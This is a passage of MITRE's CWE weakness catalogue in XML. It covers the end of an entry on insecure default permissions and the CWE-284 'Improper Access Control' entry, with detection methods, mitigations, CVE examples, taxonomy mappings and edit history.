     <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
     <Common_Consequences>
      <Consequence>
        <Scope>Confidentiality</Scope>
        <Scope>Integrity</Scope>
        <Impact>Read Application Data</Impact>
        <Impact>Modify Application Data</Impact>
      </Consequence>
     </Common_Consequences>
     <Detection_Methods>
      <Detection_Method>
        <Method>Automated Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inter-application Flow Analysis</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Automated Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria</xhtml:li>
              <xhtml:li>Web Application Scanner</xhtml:li>
              <xhtml:li>Web Services Scanner</xhtml:li>
              <xhtml:li>Database Scanners</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Manual Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host Application Interface Scanner</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Fuzz Tester</xhtml:li>
              <xhtml:li>Framework-based Fuzzer</xhtml:li>
              <xhtml:li>Automated Monitored Execution</xhtml:li>
              <xhtml:li>Forced Path Execution</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Configuration Checker</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Architecture or Design Review</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
     </Detection_Methods>
     <Potential_Mitigations>
      <Mitigation Mitigation_ID="MIT-1">
        <Phase>Architecture and Design</Phase>
        <Phase>Operation</Phase>
        <Description>The architecture needs to access and modification attributes for files to only those users who actually require those actions.</Description>
      </Mitigation>
      <Mitigation Mitigation_ID="MIT-46">
        <Phase>Architecture and Design</Phase>
        <Strategy>Separation of Privilege</Strategy>
        <Description>
          <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
          <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
        </Description>
      </Mitigation>
     </Potential_Mitigations>
     <Observed_Examples>
      <Observed_Example>
        <Reference>CVE-2005-1941</Reference>
        <Description>Executables installed world-writable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2005-1941</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1713</Reference>
        <Description>Home directories installed world-readable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1713</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-1550</Reference>
        <Description>World-writable log files allow information loss; world-readable file has cleartext passwords.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-1550</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1711</Reference>
        <Description>World-readable directory.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1711</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1844</Reference>
        <Description>Windows product uses insecure permissions when installing on Solaris (genesis: port error).</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1844</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-0497</Reference>
        <Description>Insecure permissions for a shared secret key file. Overlaps cryptographic problem.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-0497</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-1999-0426</Reference>
        <Description>Default permissions of a device allow IP spoofing.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-1999-0426</Link>
      </Observed_Example>
     </Observed_Examples>
     <Taxonomy_Mappings>
      <Taxonomy_Mapping Taxonomy_Name="PLOVER">
        <Entry_Name>Insecure Default Permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
        <Entry_ID>FIO06-C</Entry_ID>
        <Entry_Name>Create files with appropriate access permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
        <Entry_ID>FIO01-J</Entry_ID>
        <Entry_Name>Create files with appropriate access permission</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	<Entry_ID>Part 2-4</Entry_ID>
	<Entry_Name>Req SP.03.08</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	<Entry_ID>Part 4-2</Entry_ID>
	<Entry_Name>Req CR 2.1</Entry_Name>
      </Taxonomy_Mapping>
     </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
         </Related_Attack_Patterns>
         <References>
      <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Insecure Defaults&#34;, Page 69"/>
     </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
     <Content_History>
      <Submission>
        <Submission_Name>PLOVER</Submission_Name>
        <Submission_Date>2006-07-19</Submission_Date>
        <Submission_Version>Draft 3</Submission_Version>
        <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
      </Submission>
      <Modification>
        <Modification_Name>Eric Dalci</Modification_Name>
        <Modification_Organization>Cigital</Modification_Organization>
        <Modification_Date>2008-07-01</Modification_Date>
        <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-09-08</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-11-24</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2009-05-27</Modification_Date>
        <Modification_Comment>updated Description, Name</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-06-01</Modification_Date>
        <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-09-13</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-05-11</Modification_Date>
        <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-10-30</Modification_Date>
        <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2014-07-30</Modification_Date>
        <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-05-03</Modification_Date>
        <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-11-08</Modification_Date>
        <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
      <Previous_Entry_Name Date="2009-05-27">Insecure Default Permissions</Previous_Entry_Name>
     </Content_History>
   </Weakness>
      <Weakness ID="284" Name="Improper Access Control" Abstraction="Pillar" Structure="Simple" Status="Incomplete">
         <Description>The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor.</Description>
         <Extended_Description>
            <xhtml:p>Access control involves the use of several protection mechanisms such as:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>Authentication (proving the identity of an actor)</xhtml:li>
               <xhtml:li>Authorization (ensuring that a given actor can access a resource), and</xhtml:li>
               <xhtml:li>Accountability (tracking of activities that were performed)</xhtml:li>
            </xhtml:ul>
            <xhtml:p>When any mechanism is not applied or otherwise fails, attackers can compromise the security of the product by gaining privileges, reading sensitive information, executing commands, evading detection, etc.</xhtml:p>
            <xhtml:p>There are two distinct behaviors that can introduce access control weaknesses:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.</xhtml:li>
                  <xhtml:li>Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Authorization</Term>
               <Description>The terms "access control" and "authorization" are often used interchangeably, although many people have distinct definitions. The CWE usage of "access control" is intended as a general term for the various mechanisms that restrict which users can access which resources, and "authorization" is more narrowly defined. It is unlikely that there will be community consensus on the use of these terms.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24985</Reference>
               <Description>A form hosting website only checks the session authentication status for a single form, making it possible to bypass authentication when there are multiple forms</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24985</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29238</Reference>
               <Description>Access-control setting in web-based document collaboration tool is not properly implemented by the code, which prevents listing hidden directories but does not prevent direct requests to files in those directories.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-23607</Reference>
               <Description>Python-based HTTP library did not scope cookies to a particular domain such that "supercookies" could be sent to any domain on redirect</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-23607</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-35033</Reference>
			  <Description>Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-35033</Link>
			</Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2020-10263</Reference>
			  <Description>Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2020-10263</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-4624</Reference>
               <Description>Bulletin board applies restrictions on number of images during post creation, but does not enforce this on editing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-4624</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Access Control List (ACL) errors</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>2</Entry_ID>
               <Entry_Name>Insufficient Authorization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Missing Access Control</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="19"/>
            <Related_Attack_Pattern CAPEC_ID="441"/>
            <Related_Attack_Pattern CAPEC_ID="478"/>
            <Related_Attack_Pattern CAPEC_ID="479"/>
            <Related_Attack_Pattern CAPEC_ID="502"/>
            <Related_Attack_Pattern CAPEC_ID="503"/>
            <Related_Attack_Pattern CAPEC_ID="536"/>
            <Related_Attack_Pattern CAPEC_ID="546"/>
            <Related_Attack_Pattern CAPEC_ID="550"/>
            <Related_Attack_Pattern CAPEC_ID="551"/>
            <Related_Attack_Pattern CAPEC_ID="552"/>
            <Related_Attack_Pattern CAPEC_ID="556"/>
            <Related_Attack_Pattern CAPEC_ID="558"/>
            <Related_Attack_Pattern CAPEC_ID="562"/>
            <Related_Attack_Pattern CAPEC_ID="563"/>
            <Related_Attack_Pattern CAPEC_ID="564"/>
            <Related_Attack_Pattern CAPEC_ID="578"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 6, &#34;Determining Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page 253"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-284 is extremely high-level, a Pillar. Its name, "Improper Access Control," is often misused in low-information vulnerability reports [REF-1287] or by active use of the OWASP Top Ten, such as "A01:2021-Broken Access Control". It is not useful for trend analysis.</Rationale>
            <Comments>Consider using descendants of CWE-284 that are more specific to the kind of access control involved, such as those involving authorization (Missing Authorization (CWE-862), Incorrect Authorization (CWE-863), Incorrect Permission Assignment for Critical Resource (CWE-732), etc.); authentication (Missing Authentication (CWE-306) or Weak Authentication (CWE-1390)); Incorrect User Management (CWE-286); Improper Restriction of Communication Channel to Intended Endpoints (CWE-923); etc.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
               <Reason Type="Abstraction"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="862" Comment="Missing Authorization"/>
			  <Suggestion CWE_ID="863" Comment="Incorrect Authorization"/>
			  <Suggestion CWE_ID="732" Comment="Incorrect Permission Assignment for Critical Resource"/>
			  <Suggestion CWE_ID="306" Comment="Missing Authentication"/>
			  <Suggestion CWE_ID="1390" Comment="Weak Authentication"/>
			  <Suggestion CWE_ID="923" Comment="Improper Restriction of Communication Channel to Intended Endpoints"/>
			</Suggestions>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">
               <xhtml:p>This entry needs more work. Possible sub-categories include:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Trusted group includes undesired entities (partially covered by CWE-286)</xhtml:li>
                  <xhtml:li>Group can perform undesired actions</xhtml:li>
                  <xhtml:li>ACL parse error does not fail closed</xhtml:li>
               </xhtml:ul>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-24</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Changed name and description; clarified difference between "access control" and "authorization."</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Modes_of_Introduction, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
